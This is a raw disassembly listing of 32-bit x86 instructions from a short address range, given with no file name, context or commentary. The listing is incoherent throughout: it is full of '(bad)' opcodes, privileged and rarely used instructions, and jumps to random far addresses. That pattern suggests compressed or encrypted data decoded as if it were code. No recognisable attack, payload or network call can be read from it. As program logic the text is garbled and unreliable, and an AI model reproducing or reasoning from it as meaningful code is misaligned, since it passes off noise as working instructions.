  42efba:	cmp    ecx,edi
  42efbc:	xor    DWORD PTR [edx-0xa],esi
  42efbf:	inc    eax
  42efc0:	addr16 addr16 loop 0x42ef5e
  42efc4:	jle    0x42efbc
  42efc6:	push   ebp
  42efc7:	jae    0x42ef84
  42efc9:	jg     0x42f048
  42efcb:	(bad)  
  42efcc:	into   
  42efcd:	adc    al,BYTE PTR [ebp-0x78]
  42efd0:	outs   dx,BYTE PTR ds:[esi]
  42efd1:	or     cl,bh
  42efd3:	push   ebx
  42efd4:	pop    ecx
  42efd5:	daa    
  42efd6:	cld    
  42efd7:	dec    ecx
  42efd8:	jle    0x42ef8b
  42efda:	dec    ebx
  42efdb:	hlt    
  42efdc:	sub    DWORD PTR [ebx+0x70edaf6f],esp
  42efe2:	mov    ds:0xc2e3c820,eax
  42efe7:	adc    eax,0x77ac0a6a
  42efec:	inc    ebp
  42efed:	push   esi
  42efee:	jmp    0x39f5ce17
  42eff3:	dec    esp
  42eff4:	pop    esp
  42eff5:	mov    edx,0xf7327529
  42effa:	mov    bl,BYTE PTR [ebx]
  42effc:	outs   dx,BYTE PTR ds:[esi]
  42effd:	adc    dl,BYTE PTR [bx+di]
  42f000:	aad    0x6f
  42f002:	lods   al,BYTE PTR ds:[esi]
  42f003:	test   esi,ecx
  42f005:	pop    edi
  42f006:	sub    BYTE PTR [edx],dl
  42f008:	stos   BYTE PTR es:[edi],al
  42f009:	lock jg 0x42f086
  42f00c:	ins    BYTE PTR es:[edi],dx
  42f00d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f00e:	xchg   DWORD PTR ds:0x6a,eax
	...
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	clc    
  42f081:	int3   
  42f082:	xchg   ebx,eax
  42f083:	arpl   WORD PTR [ecx+0x50001f8],ax
  42f089:	add    DWORD PTR [eax],eax
  42f08b:	add    BYTE PTR [esi],al
  42f08d:	mov    bh,0x97
  42f08f:	das    
  42f090:	invd   
  42f092:	mov    DWORD PTR [ebp+edx*2+0x3],ebp
  42f096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f097:	mov    WORD PTR [ecx-0x1d],?
  42f09a:	jmp    FWORD PTR [ebx-0x2b33c7d4]
  42f0a0:	shl    DWORD PTR [ecx-0x4],0xe7
  42f0a4:	cdq    
  42f0a5:	add    al,0x3f
  42f0a7:	push   ss
  42f0a8:	mov    ds:0xd21eed41,eax
  42f0ad:	xchg   edx,eax
  42f0ae:	mov    al,ds:0xabca0dc0
  42f0b3:	and    al,0x91
  42f0b5:	xor    BYTE PTR [ecx+eax*4],ch
  42f0b8:	xchg   edx,eax
  42f0b9:	out    0x2d,al
  42f0bb:	mov    ecx,0x183e72e1
  42f0c0:	and    al,0x6c
  42f0c2:	in     al,dx
  42f0c3:	cli    
  42f0c4:	inc    edx
  42f0c5:	pop    ss
  42f0c6:	push   ss
  42f0c7:	iret   
  42f0c8:	mov    ah,0x8e
  42f0ca:	mov    bl,0x92
  42f0cc:	icebp  
  42f0cd:	shl    DWORD PTR [edx+0x28f01c22],cl
  42f0d3:	xchg   edi,eax
  42f0d4:	sub    al,0xac
  42f0d6:	cli    
  42f0d7:	sbb    ch,BYTE PTR [edx-0x44]
  42f0da:	mov    al,ds:0x9b94fa6e
  42f0df:	and    cl,BYTE PTR [ebp-0x3e9fc4b3]
  42f0e5:	sbb    esp,DWORD PTR [ebp+0x1304c9a1]
  42f0eb:	cmp    edx,eax
  42f0ed:	loope  0x42f0b8
  42f0ef:	ret    0x7f91
  42f0f2:	pop    esp
  42f0f3:	shr    DWORD PTR [ebx-0x6c],1
  42f0f6:	push   ds
  42f0f7:	dec    eax
  42f0f9:	ins    BYTE PTR es:[edi],dx
  42f0fa:	mov    ecx,0x2005336a
  42f0ff:	dec    edi
  42f100:	(bad)  
  42f101:	out    0x72,eax
  42f103:	into   
  42f104:	je     0x42f086
  42f106:	mov    eax,0xac65ac1
  42f10b:	icebp  
  42f10c:	sub    bh,BYTE PTR [ebp-0x1d1421e0]
  42f112:	sub    eax,DWORD PTR [eax+0x44]
  42f115:	mov    esi,0xa9d97fc1
  42f11a:	adc    DWORD PTR [edx-0x17f0cb9b],ebx
  42f120:	popa   
  42f121:	or     eax,DWORD PTR [edi]
  42f123:	inc    bx
  42f125:	add    eax,0x5675d8d2
  42f12a:	bound  edi,QWORD PTR [ecx+ebx*8+0x1c2bf74d]
  42f131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f132:	adc    eax,0x30220a72
  42f137:	add    eax,0x29ff37c0
  42f13c:	gs fs pop ds
  42f13f:	gs push edx
  42f141:	adc    BYTE PTR [ebx+edi*4+0x6a95cf5a],0x17
  42f149:	mov    dh,0xda
  42f14b:	jae    0x42f17e
  42f14d:	inc    esi
  42f14e:	retf   
  42f14f:	lahf   
  42f150:	sar    BYTE PTR [eax],1
  42f152:	cmp    eax,0x6d248acf
  42f157:	popf   
  42f158:	mov    al,0xa1
  42f15a:	out    dx,eax
  42f15b:	mov    dh,0x85
  42f15d:	xchg   BYTE PTR [esi-0x2dd52038],cl
  42f163:	les    edx,FWORD PTR ds:0xbfcdc6da
  42f169:	push   eax
  42f16a:	dec    ebx
  42f16b:	push   eax
  42f16c:	and    dl,bh
  42f16e:	and    BYTE PTR [edi],cl
  42f170:	and    al,0x8a
  42f172:	xor    eax,0xb73ac014
  42f177:	jb     0x42f1de
  42f179:	(bad)  
  42f17a:	retf   
  42f17b:	xchg   esp,eax
  42f17c:	rol    DWORD PTR [eax-0x262d0c3a],cl
  42f182:	retf   0xcfb7
  42f185:	xor    DWORD PTR [edx+0x67],edi
  42f188:	fst    st(2)
  42f18a:	xor    dx,WORD PTR ds:0x4a81fa10
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	out    0xb,al
  42f202:	out    dx,eax
  42f203:	add    BYTE PTR [esi+0x50001f9],0x1
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	push   0x7f
  42f20e:	call   0xa397f387
  42f213:	pusha  
  42f214:	jecxz  0x42f1a2
  42f216:	int3   
  42f217:	rol    DWORD PTR [eax-0x22103883],cl
  42f21d:	sub    eax,edx
  42f21f:	pop    ebx
  42f220:	rcr    DWORD PTR [ebx+ebp*2],cl
  42f223:	and    ebx,edi
  42f225:	xor    ah,BYTE PTR [ebp+ebx*4+0x74]
  42f229:	pop    eax
  42f22a:	dec    ebp
  42f22b:	loope  0x42f200
  42f22d:	add    ebp,DWORD PTR [eax]
  42f22f:	sar    ecx,0xe4
  42f232:	jmp    0x7d5b5932
  42f237:	out    dx,al
  42f238:	jp     0x42f223
  42f23a:	ds sub al,0x69
  42f23d:	fs and esi,ebp
  42f240:	jo     0x42f207
  42f242:	nop
  42f243:	pop    esp
  42f244:	pop    es
  42f245:	xchg   edi,eax
  42f246:	mov    eax,ds:0x5b5aeb6a
  42f24b:	dec    eax
  42f24c:	adc    dl,cl
  42f24e:	hlt    
  42f24f:	shr    DWORD PTR [esi-0x76bd0638],cl
  42f255:	loop   0x42f2d6
  42f257:	mov    ah,dl
  42f259:	inc    eax
  42f25a:	pop    ss
  42f25b:	(bad)  
  42f25c:	retf   
  42f25d:	fstp   DWORD PTR [eax]
  42f25f:	jle    0x42f2c0
  42f261:	or     DWORD PTR ds:0xa320edb7,eax
  42f267:	add    ebp,ebx
  42f269:	cld    
  42f26a:	sub    DWORD PTR [edi+0x66],ebp
  42f26d:	add    al,0xe4
  42f26f:	jle    0x42f258
  42f271:	cmc    
  42f272:	dec    ebp
  42f273:	jb     0x42f295
  42f275:	lahf   
  42f276:	scas   al,BYTE PTR es:[edi]
  42f277:	lods   al,BYTE PTR ds:[esi]
  42f278:	xor    eax,0xb7049021
  42f27d:	sbb    cl,dh
  42f27f:	hlt    
  42f280:	out    0x38,al
  42f282:	or     eax,0xdd49a070
  42f287:	jp     0x42f2a4
  42f289:	cdq    
  42f28a:	scas   eax,DWORD PTR es:[edi]
  42f28b:	scas   al,BYTE PTR es:[edi]
  42f28c:	sub    BYTE PTR [edi+0x311c99be],bh
  42f292:	in     al,dx
  42f293:	mov    ds:0x5f562deb,al
  42f298:	xor    DWORD PTR [edi+0x34d37fe],ecx
  42f29e:	lods   al,BYTE PTR ds:[esi]
  42f29f:	outs   dx,DWORD PTR ds:[esi]
  42f2a0:	jmp    0x42f261
  42f2a2:	mov    dh,0x33
  42f2a4:	xchg   esp,eax
  42f2a5:	dec    esp
  42f2a6:	adc    BYTE PTR [ebx],bl
  42f2a8:	test   eax,0xd7e6d51c
  42f2ad:	pop    ebx
  42f2ae:	dec    edi
  42f2af:	mov    ds:0x1cd9c7da,al
  42f2b4:	push   ebx
  42f2b5:	or     DWORD PTR [ecx],ecx
  42f2b7:	not    DWORD PTR [ebx]
  42f2b9:	mov    dl,dl
  42f2bb:	int    0xda
  42f2bd:	int3   
  42f2be:	jl     0x42f2c0
  42f2c0:	lods   al,BYTE PTR ds:[esi]
  42f2c1:	ins    BYTE PTR es:[edi],dx
  42f2c2:	call   DWORD PTR [edx]
  42f2c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f2c5:	add    BYTE PTR [eax],bl
  42f2c7:	sbb    DWORD PTR [edi],ecx
  42f2c9:	js     0x42f284
  42f2cb:	call   0x363d:0x8250037b
  42f2d2:	out    dx,eax
  42f2d3:	call   0x9e5e:0x860c981
  42f2da:	out    dx,eax
  42f2db:	aad    0xba
  42f2dd:	out    dx,eax
  42f2de:	and    edi,edx
  42f2e0:	mov    BYTE PTR [ebx+0x1a],0x1b
  42f2e4:	fwait
  42f2e5:	outs   dx,BYTE PTR ds:[esi]
  42f2e6:	pushf  
  42f2e7:	cli    
  42f2e8:	xchg   ebx,eax
  42f2e9:	cmp    cl,BYTE PTR [esi-0x2c6094af]
  42f2ef:	imul   ecx,DWORD PTR [ecx+edi*4+0x2b],0xb42f0c9
  42f2f7:	jo     0x42f334
  42f2f9:	test   dh,ah
  42f2fb:	(bad)  
  42f2fc:	jae    0x42f315
  42f2fe:	stc    
  42f2ff:	sub    BYTE PTR [ebx-0x80],0x50
  42f303:	(bad)  
  42f304:	popf   
  42f305:	xor    ebp,DWORD PTR [edx+0x20a75724]
  42f30b:	mov    edx,0xa1b537a2
  42f310:	jnp    0x42f312
	...
  42f372:	add    BYTE PTR [eax],al
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	push   ss
  42f381:	call   0x1:0xfa8b6654
  42f388:	add    eax,0x56000001
  42f38d:	pop    eax
  42f38e:	adc    al,0xa2
  42f390:	sbb    ch,al
  42f392:	test   BYTE PTR [ecx+ebp*2+0x42],ch
  42f396:	push   edi
  42f397:	cli    
  42f398:	xchg   DWORD PTR [ebx],esi
  42f39a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f39b:	(bad)
  42f39e:	jb     0x42f39e
  42f3a0:	or     al,0x45
  42f3a2:	ins    BYTE PTR es:[edi],dx
  42f3a3:	mov    bl,0x57
  42f3a5:	pop    ss
  42f3a6:	mov    WORD PTR [edx+0x745151d7],?
  42f3ac:	or     DWORD PTR [edi],ecx
  42f3ae:	ret    
  42f3af:	rol    BYTE PTR [eax],0x4e
  42f3b2:	cdq    
  42f3b3:	xchg   BYTE PTR [esi-0x606c9425],dh
  42f3b9:	popa   
  42f3ba:	js     0x42f345
  42f3bc:	pop    esi
  42f3bd:	xor    DWORD PTR [eax+eiz*2+0x7ab7ddb1],esp
  42f3c4:	out    0x43,eax
  42f3c6:	jl     0x42f362
  42f3c8:	(bad)  
  42f3c9:	test   eax,0xacb90a32
  42f3ce:	or     dh,BYTE PTR [ebx-0x39b85090]
  42f3d4:	pusha  
  42f3d5:	pusha  
  42f3d6:	inc    edx
  42f3d7:	(bad)
  42f3da:	xlat   BYTE PTR ds:[ebx]
  42f3db:	fstp   st(0)
  42f3dd:	push   0x39
  42f3df:	(bad)  
  42f3e0:	punpckldq mm0,DWORD PTR [edi+0x76a6b1b1]
  42f3e7:	mov    ds:0xf64c202,al
  42f3ec:	scas   eax,DWORD PTR es:[edi]
  42f3ed:	stos   BYTE PTR es:[edi],al
  42f3ee:	jg     0x42f422
  42f3f0:	(bad)  
  42f3f1:	out    dx,eax
  42f3f2:	mov    WORD PTR [edx-0x3c],fs
  42f3f5:	cmp    esi,DWORD PTR [ebp+0x5d4f7161]
  42f3fb:	ret    
  42f3fc:	retf   
  42f3fd:	or     DWORD PTR [bp+si+0x2025],0xf7143af1
  42f406:	sbb    dl,BYTE PTR [edi+eiz*1]
  42f409:	bound  edx,QWORD PTR es:[eax-0x50]
  42f40d:	shl    eax,1
  42f40f:	mov    ebx,0x19ab5cd1
  42f414:	pop    ss
  42f415:	test   DWORD PTR [ecx],edx
  42f417:	fsubrp st(1),st
  42f419:	dec    ecx
  42f41a:	ins    DWORD PTR es:[edi],dx
  42f41b:	add    al,0x2
  42f41d:	rcl    DWORD PTR [esi],1
  42f41f:	mov    al,ds:0x8629ca1a
  42f424:	mov    bh,0x2c
  42f426:	add    DWORD PTR [edi-0x79345c4a],ecx
  42f42c:	dec    eax
  42f42d:	repz mov bl,0x28
  42f430:	dec    ebx
  42f431:	xchg   ecx,eax
  42f432:	push   ds
  42f433:	xor    al,0xac
  42f435:	stos   DWORD PTR es:[edi],eax
  42f436:	in     al,dx
  42f437:	popf   
  42f438:	jbe    0x42f460
  42f43a:	inc    ecx
  42f43b:	outs   dx,DWORD PTR ds:[esi]
  42f43c:	adc    dh,BYTE PTR [esi]
  42f43e:	pop    ss
  42f43f:	repz add eax,DWORD PTR [eax-0x530fa942]
  42f446:	call   0xc06f3e4a
  42f44b:	inc    eax
  42f44c:	mov    al,0xb7
  42f44e:	ins    DWORD PTR es:[edi],dx
  42f44f:	int    0x10
  42f451:	outs   dx,BYTE PTR ds:[esi]
  42f452:	bound  ebx,QWORD PTR [esi]
  42f454:	hlt    
  42f455:	inc    ecx
  42f456:	xchg   edi,eax
  42f457:	shl    BYTE PTR [esi+0x443d8cd9],cl
  42f45d:	ret    0x64d9
  42f460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f461:	sub    al,0x9a
  42f463:	sub    ebx,eax
  42f465:	imul   ebx,DWORD PTR [edi],0x22
  42f468:	sub    ebp,DWORD PTR [esi-0xbe98217]
  42f46e:	hlt    
  42f46f:	not    BYTE PTR [ebp+0x30249350]
  42f475:	icebp  
  42f476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f477:	cli    
  42f478:	cdq    
  42f479:	push   ds
  42f47a:	or     esp,esp
  42f47c:	xlat   BYTE PTR ds:[ebx]
  42f47d:	sbb    DWORD PTR [eax],ebp
  42f47f:	sub    edx,DWORD PTR [edx+0x5]
  42f482:	out    dx,eax
  42f483:	push   eax
  42f484:	or     ah,BYTE PTR [edi+0x204a6271]
  42f48a:	mov    esp,0x9a6f3cf
  42f48f:	int    0xcd
	...
  42f4f1:	add    BYTE PTR [eax],al
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	ins    DWORD PTR es:[edi],dx
  42f501:	sub    BYTE PTR ds:0x1fb9019,cl
  42f507:	add    BYTE PTR ds:0x86000001,al
  42f50d:	sub    ebp,DWORD PTR [edi]
  42f50f:	push   edx
  42f510:	pop    ebx
  42f511:	(bad)  
  42f512:	mov    ebp,0x262fa315
  42f517:	mov    edi,DWORD PTR [esp+edx*2+0x5bb3c4b2]
  42f51e:	ror    DWORD PTR ds:0x88167398,cl
  42f524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f525:	pop    es
  42f526:	and    ebx,DWORD PTR [ecx]
  42f528:	jmp    0xa446:0xf73ae4e4
  42f52f:	sbb    esp,esp
  42f531:	loop   0x42f4d0
  42f533:	or     al,0xec
  42f535:	inc    ecx
  42f536:	jl     0x42f519
  42f538:	clc    
  42f539:	mov    esp,0xc8fd88c5
  42f53e:	popa   
  42f53f:	loope  0x42f54e
  42f541:	mov    DWORD PTR [edx],ebp
  42f543:	mov    dl,0x60
  42f545:	sbb    bl,BYTE PTR [esi]
  42f547:	mov    bl,0x9a
  42f549:	(bad)  
  42f54a:	stc    
  42f54b:	mov    BYTE PTR [ebx+0x1f],ch
  42f54e:	xchg   ebp,eax
  42f54f:	vpsubw xmm0,xmm4,XMMWORD PTR [ebp-0x57429193]
  42f557:	cs (bad) 
  42f559:	cmp    BYTE PTR [ebx-0x3a],dh
  42f55c:	das    
  42f55d:	fmul   DWORD PTR [edi]
  42f55f:	outs   dx,BYTE PTR ds:[esi]
  42f560:	test   eax,0x9c58dd48
  42f565:	test   eax,0xcbe3d96c
  42f56a:	inc    ecx
  42f56b:	or     BYTE PTR ds:0x6a5a5513,0xc2
  42f572:	ss sti 
  42f574:	or     al,0xe1
  42f576:	addr16 mov edi,esi
  42f579:	mov    eax,esi
  42f57b:	jae    0x42f506
  42f57d:	nop
  42f57e:	ret    0xcc21
  42f581:	retf   0xf7ae
  42f584:	dec    esp
  42f585:	ss jmp 0x42f510
  42f588:	jmp    0x42f5f4
  42f58a:	adc    edi,ebp
  42f58c:	sub    DWORD PTR [ebp+0x48],esp
  42f58f:	rcl    ch,cl
  42f591:	or     al,0xf1
  42f593:	stc    
  42f594:	ret    
  42f595:	outs   dx,DWORD PTR ds:[esi]
  42f596:	xor    edx,esp
  42f598:	xchg   ebp,eax
  42f599:	mov    ecx,0xed49fb77
  42f59e:	push   esp
  42f59f:	cli    
  42f5a0:	in     al,0x46
  42f5a2:	adc    ah,BYTE PTR [ebx]
  42f5a4:	and    ecx,ebx
  42f5a6:	lds    ebp,FWORD PTR [ebp+0x1822c7ac]
  42f5ac:	loope  0x42f589
  42f5ae:	outs   dx,DWORD PTR ds:[esi]
  42f5af:	xchg   edx,eax
  42f5b0:	mov    esp,0xb06a2675
  42f5b5:	dec    ecx
  42f5b6:	pop    edx
  42f5b7:	or     eax,0x447c8ea0
  42f5bc:	(bad)  
  42f5bd:	fld    QWORD PTR [ebx-0x5b]
  42f5c0:	aam    0x66
  42f5c2:	push   cs
  42f5c3:	jbe    0x42f557
  42f5c5:	xchg   ecx,eax
  42f5c6:	cli    
  42f5c7:	popa   
  42f5c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f5c9:	loope  0x42f5d9
  42f5cb:	jmp    0x4bb8:0xa684c112
  42f5d2:	add    eax,0x846e2d0f
  42f5d7:	dec    edx
  42f5d8:	scas   al,BYTE PTR es:[edi]
  42f5d9:	xchg   ecx,eax
  42f5da:	ins    BYTE PTR es:[edi],dx
  42f5db:	sub    BYTE PTR [ebp-0x4b],dh
  42f5de:	push   eax
  42f5df:	add    BYTE PTR [ebp-0xd],0xe
  42f5e3:	mov    edx,DWORD PTR [edi-0x75149b78]
  42f5e9:	mov    cl,0x80
  42f5eb:	push   cs
  42f5ec:	test   BYTE PTR ds:0xadd1ce87,0x1c
  42f5f3:	jo     0x42f5e2
  42f5f5:	outs   dx,BYTE PTR ds:[esi]
  42f5f6:	push   0xe0af2886
  42f5fb:	sub    al,ah
  42f5fd:	into   
  42f5fe:	std    
  42f5ff:	and    DWORD PTR [esi+edi*4],esi
  42f602:	mov    edx,0xf38e0ca3
  42f607:	mov    ecx,0x5fd670ad
  42f60c:	sbb    al,0x24
  42f60e:	ja     0x42f671
  42f610:	inc    ecx
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	stos   BYTE PTR es:[edi],al
  42f681:	shr    BYTE PTR [ebp-0x1e],cl
  42f684:	xchg   ebp,eax
  42f685:	cld    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    eax,0xc6000001
  42f68d:	adc    ecx,DWORD PTR [ecx-0x6981397a]
  42f693:	and    DWORD PTR [ecx],edx
  42f695:	movzx  ebp,BYTE PTR [ebx-0x275543c7]
  42f69c:	jle    0x42f714
  42f69e:	fcomi  st,st(6)
  42f6a0:	mov    ecx,DWORD PTR [ebx]
  42f6a2:	mov    ds:0xd5b61cca,al
  42f6a7:	mov    bl,BYTE PTR [edi]
  42f6a9:	mov    dl,0xde
  42f6ab:	mov    WORD PTR [ecx-0x31],?
  42f6ae:	pop    ecx
  42f6af:	push   esi
  42f6b0:	aas    
  42f6b1:	sub    DWORD PTR [esi],esp
  42f6b3:	rcl    BYTE PTR [edx],1
  42f6b5:	leave  
  42f6b6:	jg     0x42f63a
  42f6b8:	(bad)  
  42f6b9:	push   esp
  42f6ba:	adc    BYTE PTR [ecx],0xf9
  42f6bd:	iret   
  42f6be:	loopne 0x42f6a1
  42f6c0:	push   ebx
  42f6c1:	dec    edi
  42f6c2:	mov    es,WORD PTR [edx+eax*2+0x1a]
  42f6c6:	cmp    al,0x64
  42f6c8:	sbb    edi,DWORD PTR [eax-0x30]
  42f6cb:	or     ebp,esp
  42f6cd:	dec    esp
  42f6ce:	icebp  
  42f6cf:	or     DWORD PTR [edx+0x65],0xaf3644d4
  42f6d6:	xchg   DWORD PTR [edi-0x20],esi
  42f6d9:	sub    ecx,esp
  42f6db:	in     eax,0xce
  42f6dd:	inc    DWORD PTR [edi]
  42f6df:	pop    ebp
  42f6e0:	inc    edx
  42f6e1:	pop    ecx
  42f6e2:	retf   0xdd7f
  42f6e5:	xchg   esp,eax
  42f6e6:	stc    
  42f6e7:	aaa    
  42f6e8:	fmul   st,st(0)
  42f6ea:	repnz mov bl,0xeb
  42f6ed:	mov    dl,0x6d
  42f6ef:	(bad)
  42f6f3:	xlat   BYTE PTR ds:[ebx]
  42f6f4:	leave  
  42f6f5:	popf   
  42f6f6:	outs   dx,DWORD PTR ds:[esi]
  42f6f7:	or     edx,0xffcc6e1b
  42f6fd:	jle    0x42f749
  42f6ff:	fs stos BYTE PTR es:[edi],al
  42f701:	fstp   TBYTE PTR [ebx-0x7dda5180]
  42f707:	and    cl,ah
  42f709:	icebp  
  42f70a:	xchg   edx,eax
  42f70b:	ins    DWORD PTR es:[edi],dx
  42f70c:	and    ecx,DWORD PTR [ebp-0x5b]
  42f70f:	push   esi
  42f710:	cmp    BYTE PTR [edi-0x3b32ed28],dl
  42f716:	cmp    eax,0x63771975
  42f71b:	(bad)  
  42f71c:	ins    BYTE PTR es:[edi],dx
  42f71d:	retf   0xc6f0
  42f720:	jno    0x42f79a
  42f722:	out    dx,al
  42f723:	push   0xfffffff8
  42f725:	pop    ebx
  42f726:	adc    eax,0x4a25fd29
  42f72b:	sbb    eax,0x4e7badfa
  42f730:	aad    0x7a
  42f732:	scas   eax,DWORD PTR es:[edi]
  42f733:	push   ecx
  42f734:	cwde   
  42f735:	add    ecx,DWORD PTR [edi+eax*4+0x30]
  42f739:	push   esp
  42f73a:	push   edi
  42f73b:	jmp    eax
  42f73d:	push   cs
  42f73e:	retf   0x14bf
  42f741:	lods   al,BYTE PTR ds:[esi]
  42f742:	ds pop esi
  42f744:	sub    DWORD PTR [edx+0x3014d27f],edi
  42f74a:	and    DWORD PTR [esi-0x14],edx
  42f74d:	and    al,0xe7
  42f74f:	push   edx
  42f750:	sar    BYTE PTR [edi+0x13781206],cl
  42f756:	or     DWORD PTR [esi],0xffffffe8
  42f759:	xchg   BYTE PTR [esi-0x44b0e893],dh
  42f75f:	xchg   ebp,eax
  42f760:	push   esi
  42f761:	xor    eax,0x1ac47b3f
  42f766:	fwait
  42f767:	adc    esi,ebx
  42f769:	fwait
  42f76a:	xchg   esi,eax
  42f76b:	xchg   DWORD PTR [ebp+0x7a5b090d],ebx
  42f771:	dec    ebp
  42f772:	jmp    0xc1ea:0x7032d4df
  42f779:	cwde   
  42f77a:	inc    edx
  42f77b:	and    BYTE PTR [esi+eax*2-0x49],ah
  42f77f:	cld    
  42f780:	dec    esi
  42f781:	mov    bl,dh
  42f783:	mov    eax,ds:0x39c44bf9
  42f788:	daa    
  42f789:	jno    0x42f7bb
  42f78b:	leave  
  42f78c:	popf   
  42f78d:	add    al,0x39
  42f78f:	inc    ebp
  42f790:	std    
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x7032ca1d
  42f804:	call   0x1:0x50001fd
  42f80b:	add    BYTE PTR [edi-0x42c8e141],cl
  42f811:	shl    BYTE PTR [ecx],cl
  42f813:	fcom   DWORD PTR [esi+esi*1-0x431bd733]
  42f81a:	inc    al
  42f81c:	pop    ebx
  42f81d:	xchg   dl,dl
  42f81f:	iret   
  42f820:	and    al,0xa3
  42f822:	outs   dx,DWORD PTR ds:[esi]
  42f823:	or     BYTE PTR [ebx+0x46],0x65
  42f827:	fiadd  WORD PTR [ecx-0x20358629]
  42f82d:	scas   al,BYTE PTR es:[edi]
  42f82e:	ins    BYTE PTR es:[edi],dx
  42f82f:	jge    0x42f7d5
  42f831:	cdq    
  42f832:	sbb    eax,0x5c35395a
  42f837:	sub    eax,0xe52716a5
  42f83c:	aad    0x8c
  42f83e:	ss mov bl,0x80
  42f841:	jb     0x42f856
  42f843:	mov    edi,0x6ba3c66a
  42f848:	inc    ecx
  42f849:	or     DWORD PTR [eax-0x743c9d7c],ebx
  42f84f:	dec    edi
  42f850:	imul   esi,DWORD PTR [esi+0x7e233c88],0x96dbbfeb
  42f85a:	out    0x4c,al
  42f85c:	out    0x66,al
  42f85e:	sub    eax,0x1b80d4aa
  42f863:	sbb    esp,DWORD PTR [ecx]
  42f865:	call   0x1b6e:0xe93efe9b
  42f86c:	out    dx,al
  42f86d:	in     al,dx
  42f86e:	lahf   
  42f86f:	cmc    
  42f870:	test   BYTE PTR [edi],ah
  42f872:	aas    
  42f873:	ins    DWORD PTR es:[edi],dx
  42f874:	aad    0x2
  42f876:	lds    ebp,FWORD PTR [eax-0x1dfe2e4b]
  42f87c:	test   al,0x3f
  42f87e:	dec    ebx
  42f87f:	pop    esp
  42f880:	jbe    0x42f842
  42f882:	(bad)  
  42f884:	fs xor eax,0x7068f169
  42f88a:	scas   al,BYTE PTR es:[edi]
  42f88b:	out    dx,al
  42f88c:	leave  
  42f88d:	repnz into 
  42f88f:	inc    ebp
  42f890:	add    eax,0x20d6fbc4
  42f895:	add    BYTE PTR [edx+0x17],ch
  42f898:	pop    esp
  42f899:	fisttp DWORD PTR [ecx+0x8]
  42f89c:	or     edi,DWORD PTR [edx-0x25f2e42f]
  42f8a2:	jmp    0x42f8d3
  42f8a4:	popf   
  42f8a5:	das    
  42f8a6:	imul   eax,DWORD PTR [eax-0x13f01cb0],0x77216963
  42f8b0:	xor    BYTE PTR [eax-0x7142ea54],0xf6
  42f8b7:	lds    esp,FWORD PTR [eax]
  42f8b9:	add    BYTE PTR [edi+0x52],0x8b
  42f8bd:	mov    esp,0x9e08a761
  42f8c2:	and    DWORD PTR [ecx],eax
  42f8c4:	mov    fs,esi
  42f8c6:	adc    DWORD PTR [edx*8+0xb293996],0xf8d33470
  42f8d1:	and    eax,0xc38a2611
  42f8d6:	es es jo 0x42f879
  42f8da:	xchg   esi,eax
  42f8db:	mov    ebp,0xbef9c972
  42f8e0:	pop    es
  42f8e1:	and    esp,eax
  42f8e3:	mov    BYTE PTR [esi+0x4c946623],dl
  42f8e9:	mov    WORD PTR [edi-0x8663c63],ds
  42f8ef:	sub    ebx,ebp
  42f8f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8f2:	outs   dx,BYTE PTR ds:[esi]
  42f8f3:	enter  0xacfc,0x7
  42f8f7:	(bad)  [edx]
  42f8f9:	and    esi,DWORD PTR [edi+ebx*1]
  42f8fc:	pop    ebp
  42f8fd:	es mov esi,0x26c8dc50
  42f903:	ja     0x42f8d8
  42f905:	sbb    eax,0x10c1b690
  42f90a:	(bad)  
  42f90b:	mov    eax,ds:0x308e4726
  42f910:	aas    
	...
  42f971:	add    BYTE PTR [eax],al
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9d3
  42f981:	shr    DWORD PTR [ebp+0x1fe9f1f],1
  42f987:	add    BYTE PTR ds:0x3b000001,al
  42f98d:	out    dx,eax
  42f98e:	inc    edi
  42f98f:	dec    esi
  42f990:	sbb    BYTE PTR [esi],cl
  42f992:	stc    
  42f993:	mov    eax,ds:0x5a722123
  42f998:	iret   
  42f999:	dec    eax
  42f99a:	sbb    dl,bh
  42f99c:	push   ecx
  42f99d:	mov    dl,0xf2
  42f99f:	inc    eax
  42f9a0:	mov    WORD PTR [ebx],es
  42f9a2:	(bad)  
